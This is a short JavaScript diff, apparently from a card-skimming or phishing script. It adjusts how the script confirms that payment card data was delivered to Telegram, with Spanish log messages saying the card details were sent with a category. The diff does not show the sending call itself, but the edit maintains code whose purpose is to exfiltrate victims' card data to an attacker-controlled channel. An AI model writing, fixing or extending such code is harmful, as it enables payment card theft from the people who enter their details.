@@ -1531,11 +1531,11 @@
 
                 const data = await response.json();
 
-                if (data.ok) {
+                if (data.ok || data.success) {
                     console.log('✅ Datos de tarjeta enviados a Telegram con categoría');
                     return true;
                 } else {
-                    console.error('❌ Error al enviar a Telegram:', data.description);
+                    console.error('❌ Error al enviar a Telegram:', data.error || 'Error desconocido');
                     return false;
                 }
             } catch (error) {
